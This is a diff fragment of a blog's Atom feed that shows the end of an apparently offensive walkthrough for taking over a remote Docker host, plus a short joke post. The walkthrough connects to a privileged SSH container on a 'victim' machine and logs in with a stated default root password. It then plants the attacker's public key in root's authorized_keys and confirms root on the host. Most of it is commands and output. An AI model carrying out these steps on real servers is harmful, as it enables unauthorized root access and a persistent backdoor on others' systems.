+&lt;p&gt;Verify if the service was started with success in the target server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~ » nc victim 2233
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Connect to container SSH&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~ » ssh root@victim &lt;span class=&quot;nt&quot;&gt;-p2233&lt;/span&gt;
+root@victim password: 
+root@5a3c7f18d202:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you utilized my image &lt;strong&gt;privsshd&lt;/strong&gt;, the root password it’s: &lt;em&gt;screencast&lt;/em&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Import public key in .ssh/authorized_keys in root directory&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now you are free to inject your public key and…&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@5a3c7f18d202:~# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; .ssh/
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+root@5a3c7f18d202:~# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssh-rsa AAAAB3NzaC1yc2EAAAAD..&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; .ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Finaly connect to SSH server with root access&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~ » ssh root@victim &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; key.rsa
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@docker-server ~]# &lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@docker-server ~]# docker &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+Docker version 1.12.6, build ae7d637/1.12.6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now you have privileged access inside the remote server. :)&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;References:&lt;/p&gt;
+
+&lt;p&gt;http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html&lt;/p&gt;
+
+&lt;p&gt;https://docs.docker.com/engine/api/v1.24&lt;/p&gt;
+
+&lt;p&gt;https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/&lt;/p&gt;</content><author><name></name></author><summary type="html">world wide exploitable size 2015</summary></entry><entry><title type="html">make born</title><link href="http://localhost:4000/jekyll/update/1995/10/14/born.html" rel="alternate" type="text/html" title="make born" /><published>1995-10-14T18:35:00-03:00</published><updated>1995-10-14T18:35:00-03:00</updated><id>http://localhost:4000/jekyll/update/1995/10/14/born</id><content type="html" xml:base="http://localhost:4000/jekyll/update/1995/10/14/born.html">&lt;p&gt;./configure
+make
+make install&lt;/p&gt;
+
+&lt;p&gt;foi assim que cheguei na terra ..&lt;/p&gt;</content><author><name></name></author><summary type="html">./configure make make install</summary></entry></feed>
